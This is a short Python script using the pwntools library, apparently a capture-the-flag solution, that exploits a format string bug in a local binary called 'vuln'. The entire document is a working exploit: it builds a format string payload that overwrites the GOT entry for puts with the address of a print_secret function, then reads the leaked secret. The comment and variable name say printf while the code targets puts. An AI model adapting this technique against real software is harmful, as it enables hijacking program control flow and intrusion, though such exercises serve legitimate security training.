#!/usr/bin/env python3

from pwn import *
exe = ELF("vuln")

context.binary = exe

print_secret = exe.symbols["print_secret"]
printf_got = exe.got["puts"]

def conn():
    r = process([exe.path])
    return r


def main():

    # Exploit string format to overwrite printf GOT entry with print_secret address
    r = conn()
    payload = fmtstr_payload(6, {printf_got: print_secret})
    r.sendlineafter(b"?\n", payload)
    r.recvuntil(b"Secret: ")
    print(r.recvline())

if __name__ == "__main__":
    main()
